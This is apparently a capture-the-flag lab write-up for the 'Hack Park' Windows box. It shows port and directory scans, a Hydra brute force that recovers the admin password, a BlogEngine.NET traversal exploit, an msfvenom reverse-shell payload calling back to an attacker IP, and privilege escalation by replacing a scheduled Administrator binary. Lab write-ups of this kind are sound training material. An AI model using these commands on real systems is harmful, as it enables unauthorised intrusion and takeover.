# Hack Park


# Recon

_Ports Open_

```
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
```

_Gobuster Scan_


```
/account (Status: 301)
/ADMIN (Status: 302)
/admin (Status: 302)
/Admin (Status: 302)
/Archive (Status: 200)
/archive (Status: 200)
/archives (Status: 200)
/aspnet_client (Status: 301)
/contact (Status: 200)
/contact_bean (Status: 200)
/contact_us (Status: 200)
/contactinfo (Status: 200)
/contact-us (Status: 200)
/contactus (Status: 200)
/Contact (Status: 200)
/contacts (Status: 200)
/contact-form (Status: 200)
/contacto (Status: 200)
/ContactUs (Status: 200)
/content (Status: 301)
/Content (Status: 301)
/custom (Status: 301)
/fonts (Status: 301)
/robots.txt (Status: 200)
/scripts (Status: 301)
/Scripts (Status: 301)
/search_results (Status: 200)
/search_result (Status: 200)
/search (Status: 200)
/searchnx (Status: 200)
/Search (Status: 200)
/searchresults (Status: 200)
/search-results (Status: 200)
/searchurl (Status: 200)
/setup (Status: 302)
===============================================================
2020/07/08 07:16:18 Finished
===============================================================

```

_Login Creds_


*/admin* is a redirect to a login page.


When trying to recover password by using the username "testuser123456" it got an error saying "no such user" when trying admin there was an error sending the email

```
Username: admin
```

Brute forcing with Hydra gave us the password

```
[80][http-post-form] host: 10.10.73.203   login: admin   password: 1qaz2wsx
```

```
USERNAME: admin
Password: 1qaz2wsx
```

## Exploiting


By using *BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution* and setting our nc listener on port 6942 we are reading to upload our exploit

```
nc -nlvp 6942
```

By Accessing *?theme=../../App_Data/files* we get remote access

## Privilege Escalation

We are going to get a meterpreter shell to make our lives easier.

```
â–¶ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.13.150 LPORT=6943 > exploit.exe
```

We will now download it on the windows machine, we can either use *powershell* to download the file or just simply *curl*

By trying to run getsystem we get an error message, so we need to priv-esc some other way.

After uploading *winPEAS* on the server we can run it and read the output

We find that *WScheduler* is running, by checking the *log file* we find that it runs *Message.exe* once every 30 sec as *Administrator*.

Create another shell with msfvenom, name it *Message.exe* and replace the original *Message.exe* with our shell.

Use *msfconsole* and and wait for the connection.

```
meterpreter > getuid
Server username: HACKPARK\Administrator
meterpreter > 

```



